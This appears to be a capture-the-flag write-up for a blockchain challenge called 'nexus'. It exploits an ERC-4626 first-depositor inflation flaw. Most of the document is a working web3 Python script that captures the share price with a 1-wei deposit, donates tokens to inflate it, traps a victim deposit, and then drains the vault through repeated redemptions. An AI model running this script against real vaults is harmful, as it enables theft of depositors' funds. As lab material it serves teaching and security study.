# nexus - Blockchain

## Methodology
* **Vulnerability:** ERC-4626 Inflation Attack (First Depositor Vulnerability)
* **Steps:**
    1.  Access the GZCLI Instance on port 50000.
    2.  Access the TCP Port Mapping page.
    3.  Solve the crypto challenge to access `RPC_URL, PRIVKEY, SETUP_ADDR, WALLET_ADDR`.
    4.  Run `solve.py` (explained below) against the instance.
    5.  Claim Flag.

## Reproducibility (Code/Commands)
```python
import time
from web3 import Web3

RPC_URL = ""
PRIVKEY = ""
SETUP_ADDR = ""
WALLET_ADDR = ""

def solve():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("[-] Connection failed")
        return
    print(f"[+] Connected to {RPC_URL}")

    # --- ABIs ---
    setup_abi = [
        {"inputs": [], "name": "conductRituals", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [], "name": "essence", "outputs": [{"internalType": "contract Essence", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
        {"inputs": [], "name": "nexus", "outputs": [{"internalType": "contract CrystalNexus", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
        {"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}
    ]

    nexus_abi = [
        {"inputs": [{"internalType": "uint256", "name": "essenceAmount", "type": "uint256"}], "name": "attune", "outputs": [{"internalType": "uint256", "name": "crystals", "type": "uint256"}], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [{"internalType": "uint256", "name": "crystalAmount", "type": "uint256"}, {"internalType": "address", "name": "recipient", "type": "address"}], "name": "dissolve", "outputs": [{"internalType": "uint256", "name": "essenceOut", "type": "uint256"}], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [{"internalType": "address", "name": "entity", "type": "address"}], "name": "crystalBalance", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"},
        {"inputs": [], "name": "totalCrystals", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}
    ]

    essence_abi = [
        {"inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [{"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [{"internalType": "address", "name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}
    ]

    setup = w3.eth.contract(address=SETUP_ADDR, abi=setup_abi)
    essence = w3.eth.contract(address=setup.functions.essence().call(), abi=essence_abi)
    nexus = w3.eth.contract(address=setup.functions.nexus().call(), abi=nexus_abi)

    total_crystals = nexus.functions.totalCrystals().call()
    if total_crystals > 0:
        print("\nERROR: Instance is dirty.")
        return

    def send_tx(func, desc):
        print(f"[*] {desc}...")
        try:
            tx = func.build_transaction({
                'from': WALLET_ADDR,
                'nonce': w3.eth.get_transaction_count(WALLET_ADDR),
                'gas': 2000000,
                'gasPrice': w3.eth.gas_price
            })
            signed = w3.eth.account.sign_transaction(tx, PRIVKEY)
            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
            w3.eth.wait_for_transaction_receipt(tx_hash)
            return True
        except Exception as e:
            print(f"    -> Error: {e}")
            return False

    # 1. Approve Nexus
    send_tx(essence.functions.approve(nexus.address, 2**256-1), "Approving Nexus")

    # 2. Buy 1 Crystal (Market Capture)
    send_tx(nexus.functions.attune(1), "Attuning 1 wei (Setting T=1)")

    # 3. Donate remaining Essence (Inflation Attack)
    my_bal = essence.functions.balanceOf(WALLET_ADDR).call()
    send_tx(essence.functions.transfer(nexus.address, my_bal), f"Donating {my_bal} ESS to spike price")

    # 4. Trigger Rituals (Trapping Setup)
    # Setup will deposit 15,000 ESS but receive 0 Crystals because we spiked the price.
    send_tx(setup.functions.conductRituals(), "Conducting Rituals (Trapping Setup)")

    # 5. Extract Funds (The Double Dip)
    print("[*] Starting extraction loop...")
    for i in range(5): # Loop a few times to drain friction
        my_crystals = nexus.functions.crystalBalance(WALLET_ADDR).call()
        if my_crystals > 0:
            send_tx(nexus.functions.dissolve(my_crystals, WALLET_ADDR), f"Dissolving {my_crystals} crystals")
        
        current_bal = essence.functions.balanceOf(WALLET_ADDR).call()
        print(f"    Current Balance: {w3.from_wei(current_bal, 'ether')} ETH")
        
        if current_bal > 20250 * 10**18:
            break
            
        # Re-enter to get the friction leftovers
        # Cost is minimal (1 wei) but payout is huge because backing pool is large
        send_tx(nexus.functions.attune(1), "Re-attuning 1 wei")

    if setup.functions.isSolved().call():
        print("\nFlag captured.")
    else:
        print("\nSomething went wrong.")

if __name__ == "__main__":
    solve()
```

## 🤖 AI Usage

* Gemini 3 Pro was used alongside manual review to analyse the solana contracts and find the issue.
* `solve.py` written manually to start, then AI was used to speed up development.

## 🚩 Proof

Flag: C2C{...}
